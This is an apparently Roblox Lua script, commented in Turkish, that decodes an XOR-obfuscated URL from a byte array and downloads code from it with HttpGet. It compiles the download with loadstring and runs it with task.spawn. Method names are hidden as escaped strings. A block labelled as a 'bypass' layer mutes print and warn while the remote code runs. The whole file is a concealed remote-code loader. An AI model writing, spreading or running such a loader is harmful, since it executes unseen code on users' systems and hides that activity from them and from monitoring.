local _S = string; local _T = table; local _G = game;

local _D = {102, 112, 111, 106, 110, 46, 35, 35, 100, 102, 112, 114, 43, 101, 103, 115, 103, 117, 98, 118, 117, 104, 118, 104, 117, 118, 126, 112, 123, 131, 63, 118, 132, 132, 72, 82, 112, 128, 151, 140, 153, 136, 154, 89, 95, 99, 145, 104, 153, 154, 153, 159, 162, 118, 166, 115, 169, 173, 178, 178, 175, 183, 173, 187, 177, 180, 187, 189, 188, 190, 191, 194, 149, 149, 152, 205, 153, 222, 207, 231, 160, 213, 166, 240, 218, 219, 222, 226, 229, 177, 179, 230, 253, 249, 248, 252}

local function _XOR_SOLVE(_DATA)
    local _R = _T.create(#_DATA) -- Hız için tabloyu önceden yerleştir
    local _char = _S.char
    local _xor = bit32.bxor
    
    for i = 1, #_DATA do
        local _K = (i % 5) + 8 
        -- Şifreleme mantığına dokunulmadı: (DATA - K) XOR 0x05
        _R[i] = _char(_xor(_DATA[i] - _K, 0x05))
    end
    return _T.concat(_R) -- Tek seferde birleştir (Işık hızı)
end

local _P = {
    ["\104\116\116\112"] = _G.HttpGet, -- Doğrudan metod referansı
    ["\101\120\101"] = loadstring
}

local function _START()
    -- Hız için gereksiz kontroller optimize edildi
    local _u = _XOR_SOLVE(_D) .. "?v=" .. math.random(100, 999)
    local _res = _P["\104\116\116\112"](_G, _u, true)
    
    if _res and #_res > 10 then
        local _f = _P["\101\120\101"](_res)
        if _f then task.spawn(_f) end
    end
end

-- Bypass katmanı
local _p, _w = print, warn; print, warn = function() end, function() end;
_START()
print, warn = _p, _w;
